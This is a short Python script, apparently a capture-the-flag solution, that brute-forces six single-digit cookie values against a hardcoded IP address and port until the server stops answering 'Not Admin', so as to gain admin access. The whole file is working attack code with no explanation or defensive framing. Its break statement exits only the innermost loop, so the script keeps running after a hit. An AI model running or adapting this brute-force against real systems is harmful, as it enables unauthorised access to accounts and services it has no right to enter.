import requests

url = 'http://154.8.174.214:8080'
cookie = 'key0={0}; key1={1}; key2={2}; key3={3}; key4={4}; key5={5}'
mystring = '0123456789'

for a in mystring:
    for b in mystring:
        for c in mystring:
            for d in mystring:
                for e in mystring:
                    for f in mystring:
                        text = cookie.format(a,b,c,d,e,f)
                        print(text)
                        response=requests.get(url, headers={'cookie':text})
                        if response.text != 'Not Admin':
                            print('good!')
                            print(a,b,c,d,e,f)
                            print(response.text)
                            break
print('not good!')



